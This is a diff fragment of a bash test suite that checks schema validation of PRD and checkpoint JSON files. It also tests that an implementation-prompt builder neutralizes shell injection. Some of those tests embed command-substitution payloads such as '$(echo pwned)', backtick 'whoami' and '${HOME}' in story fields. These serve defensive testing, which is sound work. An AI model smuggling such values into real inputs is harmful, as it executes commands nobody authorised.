+{"project":"T","sourceReq":"REQ-01","userStories":[{"id":"US-001","title":"X","acceptanceCriteria":"not-array"}]}
+EOF
+  output=$(validate_prd_schema "$TEST_TEMP/bad-ac.json" 2>&1) && exit 1
+  echo "$output" | grep -q "acceptanceCriteria must be an array"
+)
+test_result "schema: validate_prd_schema rejects non-array acceptanceCriteria" $?
+
+# Test: validate_prd_schema rejects non-boolean passes
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  cat > "$TEST_TEMP/bad-passes.json" <<'EOF'
+{"project":"T","sourceReq":"REQ-01","userStories":[{"id":"US-001","title":"X","acceptanceCriteria":["a"],"passes":"yes"}]}
+EOF
+  output=$(validate_prd_schema "$TEST_TEMP/bad-passes.json" 2>&1) && exit 1
+  echo "$output" | grep -q "passes must be a boolean"
+)
+test_result "schema: validate_prd_schema rejects non-boolean passes" $?
+
+echo ""
+echo "--- Schema: validate_checkpoint_schema ---"
+
+# Test: validate_checkpoint_schema passes for valid checkpoint fixture
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  validate_checkpoint_schema "$REQDRIVE_ROOT/tests/fixtures/valid-checkpoint.json" 2>/dev/null
+)
+test_result "schema: validate_checkpoint_schema passes for valid checkpoint" $?
+
+# Test: validate_checkpoint_schema rejects invalid JSON
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo 'not json' > "$TEST_TEMP/bad-cp.json"
+  ! validate_checkpoint_schema "$TEST_TEMP/bad-cp.json" 2>/dev/null
+)
+test_result "schema: validate_checkpoint_schema rejects invalid JSON" $?
+
+# Test: validate_checkpoint_schema rejects missing req_id
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{"branch":"b","iteration":1}' > "$TEST_TEMP/no-reqid.json"
+  output=$(validate_checkpoint_schema "$TEST_TEMP/no-reqid.json" 2>&1) && exit 1
+  echo "$output" | grep -q "missing required field: req_id"
+)
+test_result "schema: validate_checkpoint_schema rejects missing req_id" $?
+
+# Test: validate_checkpoint_schema rejects missing branch
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{"req_id":"REQ-01","iteration":1}' > "$TEST_TEMP/no-branch.json"
+  output=$(validate_checkpoint_schema "$TEST_TEMP/no-branch.json" 2>&1) && exit 1
+  echo "$output" | grep -q "missing required field: branch"
+)
+test_result "schema: validate_checkpoint_schema rejects missing branch" $?
+
+# Test: validate_checkpoint_schema rejects missing iteration
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{"req_id":"REQ-01","branch":"b"}' > "$TEST_TEMP/no-iter.json"
+  output=$(validate_checkpoint_schema "$TEST_TEMP/no-iter.json" 2>&1) && exit 1
+  echo "$output" | grep -q "missing required field: iteration"
+)
+test_result "schema: validate_checkpoint_schema rejects missing iteration" $?
+
+# Test: validate_checkpoint_schema rejects non-number iteration
+(
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  echo '{"req_id":"REQ-01","branch":"b","iteration":"three"}' > "$TEST_TEMP/bad-iter.json"
+  output=$(validate_checkpoint_schema "$TEST_TEMP/bad-iter.json" 2>&1) && exit 1
+  echo "$output" | grep -q "iteration must be a number"
+)
+test_result "schema: validate_checkpoint_schema rejects non-number iteration" $?
 
 echo ""
 echo "--- Iteration Summary Tests ---"
@@ -330,6 +1087,72 @@ test_result "summary: extract_iteration_summary extracts valid block" $?
   [ ! -f "$TEST_TEMP/agent2/iteration-1.summary.json" ]
 )
 test_result "summary: handles missing summary gracefully" $?
+
+echo ""
+echo "--- Implementation Prompt Sanitization Tests ---"
+
+# Test: build_implementation_prompt neutralizes $(cmd) in story title
+(
+  export REQDRIVE_ROOT
+  source "$REQDRIVE_ROOT/lib/errors.sh"
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  source "$REQDRIVE_ROOT/lib/preflight.sh"
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true
+
+  prompt_file="$TEST_TEMP/prompt-inject.md"
+  story_json='{"title":"$(echo pwned)","description":"normal","acceptanceCriteria":["done"],"id":"US-001","priority":1,"passes":false}'
+  sanitized_content="Some requirement text"
+
+  build_implementation_prompt "$prompt_file" "US-001" "$story_json" "$sanitized_content"
+
+  # The literal string $(echo pwned) must NOT have been expanded
+  grep -q '$(echo pwned)' "$prompt_file" || grep -q '\$(echo pwned)' "$prompt_file"
+  # And the word "pwned" must not appear alone (i.e., it was not executed)
+  ! grep -qx 'pwned' "$prompt_file"
+)
+test_result "impl prompt: neutralizes \$(cmd) in story title" $?
+
+# Test: build_implementation_prompt neutralizes backticks in story description
+(
+  export REQDRIVE_ROOT
+  source "$REQDRIVE_ROOT/lib/errors.sh"
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  source "$REQDRIVE_ROOT/lib/preflight.sh"
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true
+
+  prompt_file="$TEST_TEMP/prompt-backtick.md"
+  story_json='{"title":"Safe title","description":"Use `whoami` to attack","acceptanceCriteria":["done"],"id":"US-002","priority":1,"passes":false}'
+  sanitized_content="Some requirement text"
+
+  build_implementation_prompt "$prompt_file" "US-002" "$story_json" "$sanitized_content"
+
+  # Backtick command substitution must not produce raw command output
+  # sanitize_for_prompt replaces backticks with single quotes
+  ! grep -q '`whoami`' "$prompt_file"
+)
+test_result "impl prompt: neutralizes backticks in story description" $?
+
+# Test: build_implementation_prompt neutralizes ${VAR} in acceptance criteria
+(
+  export REQDRIVE_ROOT
+  source "$REQDRIVE_ROOT/lib/errors.sh"
+  source "$REQDRIVE_ROOT/lib/sanitize.sh"
+  source "$REQDRIVE_ROOT/lib/preflight.sh"
+  source "$REQDRIVE_ROOT/lib/schema.sh"
+  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true
+
+  prompt_file="$TEST_TEMP/prompt-varexp.md"
+  story_json='{"title":"Normal","description":"Normal","acceptanceCriteria":["Check ${HOME} variable"],"id":"US-003","priority":1,"passes":false}'
+  sanitized_content="Some requirement text"
+
+  build_implementation_prompt "$prompt_file" "US-003" "$story_json" "$sanitized_content"
+
+  # ${HOME} must not have been expanded to the actual home directory
+  ! grep -q "$HOME" "$prompt_file"
+)
+test_result "impl prompt: neutralizes \${VAR} in acceptance criteria" $?
 
 echo ""
 echo "--- CLI Tests ---"
